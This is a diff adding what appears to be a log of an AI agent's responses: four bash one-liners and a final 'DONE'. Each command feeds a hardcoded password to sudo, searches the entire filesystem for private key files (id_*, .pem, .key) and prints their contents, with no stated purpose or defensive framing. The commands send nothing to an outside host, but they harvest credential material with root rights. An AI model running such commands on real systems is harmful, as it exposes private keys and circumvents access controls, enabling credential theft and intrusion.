@@ -1,0 +1,13 @@
+RESPONSE: ```bash
+echo password | sudo -S find / -type f \( -name "*id_*" -o -name "*.pem" -o -name "*.key" \) -exec grep -l "PRIVATE KEY" {} + | xargs -I {} sh -c 'echo "-----BEGIN PRIVATE KEY----- in {}-----"; echo password | sudo -S cat "{}"; echo'
+```
+RESPONSE: ```bash
+echo password | sudo -S find / -type f -exec grep -l "PRIVATE KEY" {} + 2>/dev/null | while read -r f; do echo "-----BEGIN PRIVATE KEY IN $f-----"; echo password | sudo -S cat "$f"; echo; done
+```
+RESPONSE: ```bash
+echo password | sudo -S find / -type f \( -name "*.pem" -o -name "*.key" -o -name "id_*" \) -exec sh -c 'file="$1"; if grep -q "PRIVATE KEY" "$file"; then echo "-----BEGIN PRIVATE KEY IN $file-----"; echo password | sudo -S cat "$file"; echo; fi' sh {} \; 2>/dev/null
+```
+RESPONSE: ```bash
+echo password | sudo -S find / -type f -exec sh -c 'file="$1"; if grep -q -E "PRIVATE KEY|OPENSSH PRIVATE KEY" "$file"; then echo "-----BEGIN PRIVATE KEY IN $file-----"; echo password | sudo -S cat "$file"; echo; fi' sh {} \; 2>/dev/null
+```
+RESPONSE: DONE
